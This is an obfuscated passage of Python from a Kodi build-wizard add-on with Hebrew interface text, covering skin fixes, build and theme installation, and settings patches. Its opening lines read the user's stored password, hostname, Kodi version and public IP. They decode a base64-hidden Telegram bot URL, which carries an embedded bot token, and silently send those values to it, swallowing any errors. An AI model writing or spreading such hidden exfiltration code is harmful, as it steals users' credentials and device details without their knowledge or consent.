          OOOO0OO0000O00O0O =(ADDON .getSetting ("pass"))#line:4117
          O00O0O0000OOOOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4118
          OO00000OOO0O000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:4120
          OO0000O0O00O000OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4121
          O0000OO00O00OOOO0 =str (json .loads (OO0000O0O00O000OO )['ip'])#line:4122
          O0OOO0OO0000OO000 =OO000OO00OOO0OOOO #line:4123
          O0OOOOOO0O0000O0O =OOOO0OO0000O00O0O #line:4124
          import socket #line:4126
          OO0000O0O00O000OO =urllib2 .urlopen (OO00000OOO0O000OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OOO0OO0000OO000 +' - '+O0OOOOOO0O0000O0O +' - '+O00O0O0000OOOOOOO +' - '+O0000OO00O00OOOO0 ).readlines ()#line:4127
       except :pass #line:4129
def skinfix18 ():#line:4131
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:4132
		O0000OO00O0OO0OO0 =wiz .workingURL (SKINID18DDONXML )#line:4133
		if O0000OO00O0OO0OO0 ==True :#line:4134
			OO00O0OO0000OO00O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:4135
			if len (OO00O0OO0000OO00O )>0 :#line:4136
				OO00OO0O0O00OO0O0 ='%s-%s.zip'%(SKINID18 ,OO00O0OO0000OO00O [0 ])#line:4137
				OO000OOO0O000OOOO =wiz .workingURL (SKIN18ZIPURL +OO00OO0O0O00OO0O0 )#line:4138
				if OO000OOO0O000OOOO ==True :#line:4139
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4140
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4141
					OO00OO00O0000O0O0 =os .path .join (PACKAGES ,OO00OO0O0O00OO0O0 )#line:4142
					try :os .remove (OO00OO00O0000O0O0 )#line:4143
					except :pass #line:4144
					downloader .download (SKIN18ZIPURL +OO00OO0O0O00OO0O0 ,OO00OO00O0000O0O0 ,DP )#line:4145
					extract .all (OO00OO00O0000O0O0 ,HOME ,DP )#line:4146
					try :#line:4147
						O00O0OO0OOOOOOOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4148
						O0O0O0OO00OOOOO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4149
						os .rename (O00O0OO0OOOOOOOO0 ,O0O0O0OO00OOOOO00 )#line:4150
					except :#line:4151
						pass #line:4152
					try :#line:4153
						OO00OO0OOOO00OO00 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO00OOOO00OOOOOOO =OO00OO0OOOO00OO00 .read ();OO00OO0OOOO00OO00 .close ()#line:4154
						O0O00OO0OO0OO0OO0 =wiz .parseDOM (OO00OOOO00OOOOOOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:4155
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00OO0OO0OO0OO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:4156
					except :#line:4157
						pass #line:4158
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:4159
					DP .close ()#line:4160
					xbmc .sleep (500 )#line:4161
					wiz .forceUpdate (True )#line:4162
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4163
				else :#line:4164
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4165
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO000OOO0O000OOOO ,xbmc .LOGERROR )#line:4166
			else :#line:4167
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4168
		else :#line:4169
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4170
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4171
def skinfix17 ():#line:4172
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:4173
		OO0OOOOOO000OO0OO =wiz .workingURL (SKINID17DDONXML )#line:4174
		if OO0OOOOOO000OO0OO ==True :#line:4175
			OO0OOO00OO00O00O0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:4176
			if len (OO0OOO00OO00O00O0 )>0 :#line:4177
				O0OOOOOO00O00OO0O ='%s-%s.zip'%(SKINID17 ,OO0OOO00OO00O00O0 [0 ])#line:4178
				O0O000000OOO0O00O =wiz .workingURL (SKIN17ZIPURL +O0OOOOOO00O00OO0O )#line:4179
				if O0O000000OOO0O00O ==True :#line:4180
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4181
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4182
					OO000OO0OOOO00O00 =os .path .join (PACKAGES ,O0OOOOOO00O00OO0O )#line:4183
					try :os .remove (OO000OO0OOOO00O00 )#line:4184
					except :pass #line:4185
					downloader .download (SKIN17ZIPURL +O0OOOOOO00O00OO0O ,OO000OO0OOOO00O00 ,DP )#line:4186
					extract .all (OO000OO0OOOO00O00 ,HOME ,DP )#line:4187
					try :#line:4188
						O00OOOO00OOO0OO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4189
						O0OO0O000O0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4190
						os .rename (O00OOOO00OOO0OO00 ,O0OO0O000O0OOOO00 )#line:4191
					except :#line:4192
						pass #line:4193
					try :#line:4194
						OOO00O00O0OO00O0O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0O0O00OOO0000O0O =OOO00O00O0OO00O0O .read ();OOO00O00O0OO00O0O .close ()#line:4195
						O0OOOO0OO00OOOOO0 =wiz .parseDOM (O0O0O00OOO0000O0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:4196
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO0OO00OOOOO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:4197
					except :#line:4198
						pass #line:4199
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:4200
					DP .close ()#line:4201
					xbmc .sleep (500 )#line:4202
					wiz .forceUpdate (True )#line:4203
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4204
				else :#line:4205
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4206
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0O000000OOO0O00O ,xbmc .LOGERROR )#line:4207
			else :#line:4208
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4209
		else :#line:4210
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4211
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4212
def fix17update ():#line:4213
	if KODIV >=17 and KODIV <18 :#line:4214
		wiz .kodi17Fix ()#line:4215
		xbmc .sleep (4000 )#line:4216
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4217
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4218
		fixfont ()#line:4219
		OO0OOOO0OO000000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4220
		try :#line:4222
			OO0O0000OO0000OOO =open (OO0OOOO0OO000000O ,'r')#line:4223
			OO0OOO0OOO0O00OO0 =OO0O0000OO0000OOO .read ()#line:4224
			OO0O0000OO0000OOO .close ()#line:4225
			OO00O0O00O00OO000 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:4226
			O00OO00000000OOO0 =re .compile (OO00O0O00O00OO000 ).findall (OO0OOO0OOO0O00OO0 )[0 ]#line:4227
			OO0O0000OO0000OOO =open (OO0OOOO0OO000000O ,'w')#line:4228
			OO0O0000OO0000OOO .write (OO0OOO0OOO0O00OO0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00OO00000000OOO0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:4229
			OO0O0000OO0000OOO .close ()#line:4230
		except :#line:4231
				pass #line:4232
		wiz .kodi17Fix ()#line:4233
		OO0OOOO0OO000000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4234
		try :#line:4235
			OO0O0000OO0000OOO =open (OO0OOOO0OO000000O ,'r')#line:4236
			OO0OOO0OOO0O00OO0 =OO0O0000OO0000OOO .read ()#line:4237
			OO0O0000OO0000OOO .close ()#line:4238
			OO00O0O00O00OO000 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:4239
			O00OO00000000OOO0 =re .compile (OO00O0O00O00OO000 ).findall (OO0OOO0OOO0O00OO0 )[0 ]#line:4240
			OO0O0000OO0000OOO =open (OO0OOOO0OO000000O ,'w')#line:4241
			OO0O0000OO0000OOO .write (OO0OOO0OOO0O00OO0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00OO00000000OOO0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:4242
			OO0O0000OO0000OOO .close ()#line:4243
		except :#line:4244
				pass #line:4245
		swapSkins ('skin.Premium.mod')#line:4246
def fix18update ():#line:4248
	if KODIV >=18 :#line:4249
		xbmc .sleep (4000 )#line:4250
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4251
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4252
		fixfont ()#line:4253
		O000O0000OOO0OOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4254
		try :#line:4255
			OOO0000OOO0O0OOOO =open (O000O0000OOO0OOOO ,'r')#line:4256
			O000O0000OOOO00OO =OOO0000OOO0O0OOOO .read ()#line:4257
			OOO0000OOO0O0OOOO .close ()#line:4258
			O0OOO00OOOOO0O0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:4259
			OO0OOO0000O0OOOOO =re .compile (O0OOO00OOOOO0O0O0 ).findall (O000O0000OOOO00OO )[0 ]#line:4260
			OOO0000OOO0O0OOOO =open (O000O0000OOO0OOOO ,'w')#line:4261
			OOO0000OOO0O0OOOO .write (O000O0000OOOO00OO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO0OOO0000O0OOOOO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:4262
			OOO0000OOO0O0OOOO .close ()#line:4263
		except :#line:4264
				pass #line:4265
		wiz .kodi17Fix ()#line:4266
		O000O0000OOO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4267
		try :#line:4268
			OOO0000OOO0O0OOOO =open (O000O0000OOO0OOOO ,'r')#line:4269
			O000O0000OOOO00OO =OOO0000OOO0O0OOOO .read ()#line:4270
			OOO0000OOO0O0OOOO .close ()#line:4271
			O0OOO00OOOOO0O0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:4272
			OO0OOO0000O0OOOOO =re .compile (O0OOO00OOOOO0O0O0 ).findall (O000O0000OOOO00OO )[0 ]#line:4273
			OOO0000OOO0O0OOOO =open (O000O0000OOO0OOOO ,'w')#line:4274
			OOO0000OOO0O0OOOO .write (O000O0000OOOO00OO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO0OOO0000O0OOOOO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:4275
			OOO0000OOO0O0OOOO .close ()#line:4276
		except :#line:4277
				pass #line:4278
		swapSkins ('skin.Premium.mod')#line:4279
def buildWizard (OOOO000O0000OOOOO ,OOOOOO00OO0O0000O ,theme =None ,over =False ):#line:4282
	OOO00O0O0OOO00000 =xbmcgui .DialogBusy ()#line:4283
	OOO00O0O0OOO00000 .create ()#line:4284
	if over ==False :#line:4285
		OOO000000000OO0O0 =wiz .checkBuild (OOOO000O0000OOOOO ,'url')#line:4286
		if USERNAME =='':#line:4287
			ADDON .openSettings ()#line:4288
			sys .exit ()#line:4289
		if PASSWORD =='':#line:4290
			ADDON .openSettings ()#line:4291
			sys .exit ()#line:4292
		if BUILDNAME =='':#line:4294
			OO00O0O000OOOO0OO =u_list (SPEEDFILE )#line:4295
			(OO00O0O000OOOO0OO )#line:4296
		if OOO000000000OO0O0 ==False :#line:4297
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:4302
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:4303
			return #line:4304
		O00O0OOO00OOO0OO0 =wiz .workingURL (OOO000000000OO0O0 )#line:4305
		if O00O0OOO00OOO0OO0 ==False :#line:4306
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00O0OOO00OOO0OO0 ))#line:4307
			return #line:4308
	if OOOOOO00OO0O0000O =='gui':#line:4309
		if OOOO000O0000OOOOO ==BUILDNAME :#line:4310
			if over ==True :OO000OOO0O0O0OOO0 =1 #line:4311
			else :OO000OOO0O0O0OOO0 =1 #line:4312
		else :#line:4313
			OO000OOO0O0O0OOO0 =1 #line:4314
		if OO000OOO0O0O0OOO0 :#line:4315
			remove_addons ()#line:4316
			remove_addons2 ()#line:4317
			debridit .debridIt ('update','all')#line:4318
			traktit .traktIt ('update','all')#line:4319
			OOO0OOO0000OO00O0 =wiz .checkBuild (OOOO000O0000OOOOO ,'gui')#line:4320
			O000OOOO0O0O0OO00 =OOOO000O0000OOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4321
			if not wiz .workingURL (OOO0OOO0000OO00O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4322
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4323
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000O0000OOOOO ),'','אנא המתן')#line:4324
			O0O0O00O0O0O00OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000OOOO0O0O0OO00 )#line:4325
			try :os .remove (O0O0O00O0O0O00OOO )#line:4326
			except :pass #line:4327
			logging .warning (OOO0OOO0000OO00O0 )#line:4328
			if 'google'in OOO0OOO0000OO00O0 :#line:4329
			   OOO0O0OOOOO0O0O0O =googledrive_download (OOO0OOO0000OO00O0 ,O0O0O00O0O0O00OOO ,DP ,wiz .checkBuild (OOOO000O0000OOOOO ,'filesize'))#line:4330
			else :#line:4333
			  downloader .download (OOO0OOO0000OO00O0 ,O0O0O00O0O0O00OOO ,DP )#line:4334
			xbmc .sleep (100 )#line:4335
			O0000O00O0OO000OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000O0000OOOOO )#line:4336
			DP .update (0 ,O0000O00O0OO000OO ,'','אנא המתן')#line:4337
			extract .all (O0O0O00O0O0O00OOO ,HOME ,DP ,title =O0000O00O0OO000OO )#line:4338
			DP .close ()#line:4339
			wiz .defaultSkin ()#line:4340
			wiz .lookandFeelData ('save')#line:4341
			try :#line:4342
				telemedia_android5fix ()#line:4343
			except :pass #line:4344
			wiz .kodi17Fix ()#line:4345
			if KODIV >=18 :#line:4346
				skindialogsettind18 ()#line:4347
			debridit .debridIt ('restore','all')#line:4348
			traktit .traktIt ('restore','all')#line:4349
			if INSTALLMETHOD ==1 :OOO0OO00O00O00OOO =1 #line:4351
			elif INSTALLMETHOD ==2 :OOO0OO00O00O00OOO =0 #line:4352
			else :DP .close ()#line:4353
			O0O0O0O0O0O00OOO0 =(NOTIFICATION2 )#line:4354
			OOOO0OO000O00O0OO =urllib2 .urlopen (O0O0O0O0O0O00OOO0 )#line:4355
			O0000OOOOO0O00000 =OOOO0OO000O00O0OO .readlines ()#line:4356
			OOO00000O0O00O0O0 =0 #line:4357
			for O0O000000000OOOO0 in O0000OOOOO0O00000 :#line:4360
				if O0O000000000OOOO0 .split (' ==')[0 ]=="noreset"or O0O000000000OOOO0 .split ()[0 ]=="noreset":#line:4361
					xbmc .executebuiltin ("ReloadSkin()")#line:4363
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:4364
					update_Votes ()#line:4365
					indicatorfastupdate ()#line:4366
				if O0O000000000OOOO0 .split (' ==')[0 ]=="reset"or O0O000000000OOOO0 .split ()[0 ]=="reset":#line:4367
					update_Votes ()#line:4369
					indicatorfastupdate ()#line:4370
					resetkodi ()#line:4371
		else :#line:4380
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4381
	if OOOOOO00OO0O0000O =='gui2':#line:4382
		if OOOO000O0000OOOOO ==BUILDNAME :#line:4383
			if over ==True :OO000OOO0O0O0OOO0 =1 #line:4384
			else :OO000OOO0O0O0OOO0 =1 #line:4385
		else :#line:4386
			OO000OOO0O0O0OOO0 =1 #line:4387
		if OO000OOO0O0O0OOO0 :#line:4388
			remove_addons ()#line:4389
			remove_addons2 ()#line:4390
			OOO0OOO0000OO00O0 =wiz .checkBuild (OOOO000O0000OOOOO ,'gui')#line:4391
			O000OOOO0O0O0OO00 =OOOO000O0000OOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4392
			if not wiz .workingURL (OOO0OOO0000OO00O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4393
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4394
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000O0000OOOOO ),'','אנא המתן')#line:4395
			O0O0O00O0O0O00OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000OOOO0O0O0OO00 )#line:4396
			try :os .remove (O0O0O00O0O0O00OOO )#line:4397
			except :pass #line:4398
			logging .warning (OOO0OOO0000OO00O0 )#line:4399
			if 'google'in OOO0OOO0000OO00O0 :#line:4400
			   OOO0O0OOOOO0O0O0O =googledrive_download (OOO0OOO0000OO00O0 ,O0O0O00O0O0O00OOO ,DP ,wiz .checkBuild (OOOO000O0000OOOOO ,'filesize'))#line:4401
			else :#line:4404
			  downloader .download (OOO0OOO0000OO00O0 ,O0O0O00O0O0O00OOO ,DP )#line:4405
			xbmc .sleep (100 )#line:4406
			O0000O00O0OO000OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000O0000OOOOO )#line:4407
			DP .update (0 ,O0000O00O0OO000OO ,'','אנא המתן')#line:4408
			extract .all (O0O0O00O0O0O00OOO ,HOME ,DP ,title =O0000O00O0OO000OO )#line:4409
			DP .close ()#line:4410
			wiz .defaultSkin ()#line:4411
			wiz .lookandFeelData ('save')#line:4412
			if INSTALLMETHOD ==1 :OOO0OO00O00O00OOO =1 #line:4415
			elif INSTALLMETHOD ==2 :OOO0OO00O00O00OOO =0 #line:4416
			else :DP .close ()#line:4417
		else :#line:4419
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4420
	elif OOOOOO00OO0O0000O =='fresh':#line:4421
		freshStart (OOOO000O0000OOOOO )#line:4422
	elif OOOOOO00OO0O0000O =='normal':#line:4423
		if url =='normal':#line:4424
			if KEEPTRAKT =='true':#line:4425
				traktit .autoUpdate ('all')#line:4426
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4427
			if KEEPREAL =='true':#line:4428
				debridit .autoUpdate ('all')#line:4429
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4430
			if KEEPLOGIN =='true':#line:4431
				loginit .autoUpdate ('all')#line:4432
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4433
		OO0000O00000O00OO =int (KODIV );O000O0OO00OO00O0O =int (float (wiz .checkBuild (OOOO000O0000OOOOO ,'kodi')))#line:4434
		if not OO0000O00000O00OO ==O000O0OO00OO00O0O :#line:4435
			if OO0000O00000O00OO ==16 and O000O0OO00OO00O0O <=15 :OO0OO00OOOO00OO0O =False #line:4436
			else :OO0OO00OOOO00OO0O =True #line:4437
		else :OO0OO00OOOO00OO0O =False #line:4438
		if OO0OO00OOOO00OO0O ==True :#line:4439
			O0O0000000O0OOOOO =1 #line:4440
		else :#line:4441
			if not over ==False :O0O0000000O0OOOOO =1 #line:4442
			else :O0O0000000O0OOOOO =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4443
		if O0O0000000O0OOOOO :#line:4444
			wiz .clearS ('build')#line:4445
			OOO0OOO0000OO00O0 =wiz .checkBuild (OOOO000O0000OOOOO ,'url')#line:4446
			O000OOOO0O0O0OO00 =OOOO000O0000OOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4447
			if not wiz .workingURL (OOO0OOO0000OO00O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4448
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4449
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OOOO000O0000OOOOO ,wiz .checkBuild (OOOO000O0000OOOOO ,'version')),'','אנא המתן')#line:4450
			O0O0O00O0O0O00OOO =os .path .join (PACKAGES ,'%s.zip'%O000OOOO0O0O0OO00 )#line:4451
			try :os .remove (O0O0O00O0O0O00OOO )#line:4452
			except :pass #line:4453
			logging .warning (OOO0OOO0000OO00O0 )#line:4454
			if 'google'in OOO0OOO0000OO00O0 :#line:4455
			   OOO0O0OOOOO0O0O0O =googledrive_download (OOO0OOO0000OO00O0 ,O0O0O00O0O0O00OOO ,DP ,wiz .checkBuild (OOOO000O0000OOOOO ,'filesize'))#line:4456
			else :#line:4459
			  downloader .download (OOO0OOO0000OO00O0 ,O0O0O00O0O0O00OOO ,DP )#line:4460
			xbmc .sleep (1000 )#line:4461
			O0000O00O0OO000OO ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO000O0000OOOOO ,wiz .checkBuild (OOOO000O0000OOOOO ,'version'))#line:4462
			DP .update (0 ,O0000O00O0OO000OO ,'','אנא המתן...')#line:4463
			OOOO0OOOO0O0O0OOO ,O00000OOO000000O0 ,OO0OO0000OO0O00O0 =extract .all (O0O0O00O0O0O00OOO ,HOME ,DP ,title =O0000O00O0OO000OO )#line:4464
			if int (float (OOOO0OOOO0O0O0OOO ))>0 :#line:4465
				try :#line:4466
					wiz .fixmetas ()#line:4467
				except :pass #line:4468
				wiz .lookandFeelData ('save')#line:4469
				wiz .defaultSkin ()#line:4470
				wiz .setS ('buildname',OOOO000O0000OOOOO )#line:4472
				wiz .setS ('buildversion',wiz .checkBuild (OOOO000O0000OOOOO ,'version'))#line:4473
				wiz .setS ('buildtheme','')#line:4474
				wiz .setS ('latestversion',wiz .checkBuild (OOOO000O0000OOOOO ,'version'))#line:4475
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4476
				wiz .setS ('installed','true')#line:4477
				wiz .setS ('extract',str (OOOO0OOOO0O0O0OOO ))#line:4478
				wiz .setS ('errors',str (O00000OOO000000O0 ))#line:4479
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO0OOOO0O0O0OOO ,O00000OOO000000O0 ))#line:4480
				fastupdatefirstbuild (NOTEID )#line:4481
				try :#line:4482
					telemedia_android5fix ()#line:4483
				except :pass #line:4484
				wiz .kodi17Fix ()#line:4485
				skin_homeselect ()#line:4486
				skin_lower ()#line:4487
				kodi17to18 ()#line:4492
				try :os .remove (O0O0O00O0O0O00OOO )#line:4494
				except :pass #line:4495
				DP .close ()#line:4515
				O0OOOOOO0000O00O0 =wiz .themeCount (OOOO000O0000OOOOO )#line:4516
				builde_Votes ()#line:4517
				indicator ()#line:4518
				if not O0OOOOOO0000O00O0 ==False :#line:4519
					buildWizard (OOOO000O0000OOOOO ,'theme')#line:4520
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4521
				if INSTALLMETHOD ==1 :OOO0OO00O00O00OOO =1 #line:4522
				elif INSTALLMETHOD ==2 :OOO0OO00O00O00OOO =0 #line:4523
				else :resetkodi ()#line:4524
				if OOO0OO00O00O00OOO ==1 :wiz .reloadFix ()#line:4526
				else :wiz .killxbmc (True )#line:4527
			else :#line:4528
				if isinstance (O00000OOO000000O0 ,unicode ):#line:4529
					OO0OO0000OO0O00O0 =OO0OO0000OO0O00O0 .encode ('utf-8')#line:4530
				O0OOOO000O0OO00O0 =open (O0O0O00O0O0O00OOO ,'r')#line:4531
				OOOOO0OO00O00O0O0 =O0OOOO000O0OO00O0 .read ()#line:4532
				O0OOO00OOO000OO00 =''#line:4533
				for OO0OO00OO0OO00O0O in OOO0O0OOOOO0O0O0O :#line:4534
				  O0OOO00OOO000OO00 ='key: '+O0OOO00OOO000OO00 +'\n'+OO0OO00OO0OO00O0O #line:4535
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0OO0000OO0O00O0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0OOO00OOO000OO00 )#line:4536
		else :#line:4537
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4538
	elif OOOOOO00OO0O0000O =='theme':#line:4539
		if theme ==None :#line:4540
			O0OOOOOO0000O00O0 =wiz .checkBuild (OOOO000O0000OOOOO ,'theme')#line:4541
			OO0OO0OOOOOO0O00O =[]#line:4542
			if not O0OOOOOO0000O00O0 =='http://'and wiz .workingURL (O0OOOOOO0000O00O0 )==True :#line:4543
				OO0OO0OOOOOO0O00O =wiz .themeCount (OOOO000O0000OOOOO ,False )#line:4544
				if len (OO0OO0OOOOOO0O00O )>0 :#line:4545
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOOO000O0000OOOOO ,COLOR1 ,len (OO0OO0OOOOOO0O00O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4546
						wiz .log ("Theme List: %s "%str (OO0OO0OOOOOO0O00O ))#line:4547
						O00OO00O00O0O000O =DIALOG .select (ADDONTITLE ,OO0OO0OOOOOO0O00O )#line:4548
						wiz .log ("Theme install selected: %s"%O00OO00O00O0O000O )#line:4549
						if not O00OO00O00O0O000O ==-1 :theme =OO0OO0OOOOOO0O00O [O00OO00O00O0O000O ];O0OO0O000OOOOOO0O =True #line:4550
